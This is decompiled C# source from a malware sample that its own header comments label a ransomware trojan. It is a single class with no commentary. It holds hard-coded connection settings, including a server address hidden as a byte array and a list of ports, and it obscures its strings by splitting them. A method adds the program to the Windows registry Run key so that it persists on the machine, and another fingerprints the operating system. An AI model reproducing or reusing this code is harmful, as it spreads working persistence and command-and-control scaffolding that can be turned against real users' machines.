// Decompiled with JetBrains decompiler
// Type: hdrmiprcav.DAEONIF
// Assembly: hdrmiprcav, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 19C57B26-C98B-40D0-861C-E3408295906D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.07-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-bff6270b7c6240c394515dc2505bb9f55d7b9df700be1777a8469143f78d0eb6.exe

using Microsoft.Win32;
using System;
using System.IO;
using System.Windows.Forms;

namespace hdrmiprcav
{
  internal static class DAEONIF
  {
    public static string my_path = Application.ExecutablePath;
    public static string my_app = Path.GetFileNameWithoutExtension(Application.ExecutablePath);
    public static string main_tp = "10.115.126.108|".Split('|')[0];
    public static int[] ports = new int[5]
    {
      6588,
      8689,
      12468,
      18874,
      22184
    };
    public static byte[] main_cons = new byte[13]
    {
      (byte) 49,
      (byte) 54,
      (byte) 55,
      (byte) 46,
      (byte) 56,
      (byte) 54,
      (byte) 46,
      (byte) 49,
      (byte) 48,
      (byte) 53,
      (byte) 46,
      (byte) 52,
      (byte) 51
    };
    public static int port;
    public static string pc_ird = "dhevta|".Split('|')[0];
    public static string del_account = "iakina|".Split('|')[0];

    public static string ops_name()
    {
      try
      {
        OperatingSystem osVersion = Environment.OSVersion;
        int num = osVersion.Version.Major;
        string str1 = num.ToString();
        num = osVersion.Version.Minor;
        string str2 = num.ToString();
        return str1 + ">" + str2;
      }
      catch
      {
        return "6>1!".Split('!')[0];
      }
    }

    public static void set_conup(string app, string path)
    {
      try
      {
        string name = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|".Split('|')[0];
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, true);
        object obj = registryKey.GetValue(DAEONIF.pc_ird + app);
        if (obj != null && !(obj.ToString() != path))
          return;
        registryKey.SetValue(DAEONIF.pc_ird + app, (object) path);
      }
      catch
      {
      }
    }

    public static string get_bytes_string(byte[] data)
    {
      char[] chArray = new char[data.Length];
      for (int index = 0; index < data.Length; ++index)
      {
        char ch = Convert.ToChar(data[index]);
        chArray[index] = ch;
      }
      return new string(chArray);
    }

    public static byte[] get_bytes_array(string value)
    {
      MemoryStream memoryStream = new MemoryStream();
      TextWriter textWriter = (TextWriter) new StreamWriter((Stream) memoryStream);
      textWriter.Write(value);
      textWriter.Flush();
      memoryStream.Flush();
      return memoryStream.ToArray();
    }

    public static string get_app_path() => Path.GetDirectoryName(DAEONIF.my_path) + "\\".ToString();
  }
}
